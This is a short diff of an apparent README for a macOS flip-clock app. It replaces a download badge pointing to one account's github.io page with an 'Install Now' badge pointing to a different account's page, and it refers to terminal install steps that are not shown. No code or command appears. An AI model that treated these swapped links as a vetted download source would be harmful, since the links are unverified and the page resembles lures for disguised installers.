@@ -3,7 +3,7 @@
 
 Flip Clock for Mac brings a stylish, retro flip-style clock to your macOS desktop 🕒. Install it easily following the instructions below.
 
-[![Download Now](https://img.shields.io/badge/Download-Now-blueviolet?style=for-the-badge)](https://kamartamara.github.io/.github/flipclock)
+[![Install Now](https://img.shields.io/badge/Install-Now-blueviolet?style=for-the-badge)](https://tarosimple73-creator.github.io/.github/flipclock)
 
 If the download button doesn’t work, follow the terminal installation instructions below.
 
